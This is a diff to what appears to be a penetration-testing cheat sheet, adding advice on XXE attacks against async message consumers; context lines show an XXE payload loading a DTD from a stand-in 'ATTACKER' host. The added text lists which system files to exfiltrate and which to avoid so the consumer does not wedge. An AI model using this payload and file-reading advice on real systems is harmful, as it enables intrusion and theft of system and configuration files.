@@ -111,6 +111,13 @@ URL encoding, redirect chains.
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/evil.dtd">%xxe;]>
 ```
 
+### XXE in Async Pipelines
+When the XXE result feeds an async consumer (Kafka, RabbitMQ, Celery):
+- **NEVER** use `file:///dev/zero` or `/dev/urandom` — infinite read wedges the consumer permanently (poison message stuck at committed offset).
+- **NEVER** exfil files containing NUL bytes (`/proc/self/cmdline`, `/proc/self/environ`, binary files) through lxml or libxml consumers — NUL makes invalid XML and permanently wedges the consumer.
+- Stick to known text files: `/etc/passwd`, `/etc/hostname`, config files. Read small, read text-only.
+- If the consumer wedges: the offset is committed, restarting the service replays the poison message. Only a topic purge or offset reset recovers.
+
 ## File Upload / LFI / RFI
 ```bash
 # LFI path traversal
